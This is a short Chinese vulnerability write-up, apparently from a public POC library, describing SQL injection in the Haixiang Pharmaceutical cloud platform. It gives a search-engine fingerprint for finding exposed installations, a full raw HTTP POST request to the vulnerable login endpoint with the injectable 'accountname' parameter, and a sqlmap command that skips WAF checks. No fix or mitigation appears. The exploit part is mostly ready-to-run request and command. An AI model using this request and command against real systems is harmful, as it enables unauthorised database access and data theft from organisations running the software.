---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# 成都海翔软件有限公司海翔药业云平台存在 sql 注入

# 一、漏洞简介
成都海翔软件有限公司海翔药业云平台存在 sql 注入

# 二 、影响版本
+ 海翔药业云平台

# 三、资产测绘
+ hunter`web.title="登录海翔"`
+ 特征


# 四、漏洞复现
漏洞位置，搜索账套处


```plain
POST /getylist_login.do HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 13
Connection: close
Cookie: JSESSIONID=CC105C5EED7D5DE8BFCB92D7F4BB74DC; __session:0.5376174871119012:=http:

accountname=1
```

sqlmap

```plain
sqlmap -r 1.txt  --skip-waf --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bn1l8e2pqvvd28hg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
